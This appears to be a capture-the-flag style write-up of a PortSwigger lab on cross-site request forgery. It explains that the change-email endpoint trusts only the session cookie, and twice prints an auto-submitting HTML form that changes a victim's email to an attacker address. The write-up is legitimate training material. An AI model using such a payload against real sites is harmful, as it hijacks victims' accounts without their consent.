# Lab: CSRF vulnerability with no defenses (Apprentice)

**Lab:** [https://portswigger.net/web-security/csrf/lab-no-defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

Credentials: `wiener:peter`

## Vulnerability
Change-email endpoint trusts session cookie only; no CSRF token.

## Solution

Exploit server body:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

Store → Deliver to victim.

## Final Exploit Payload
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
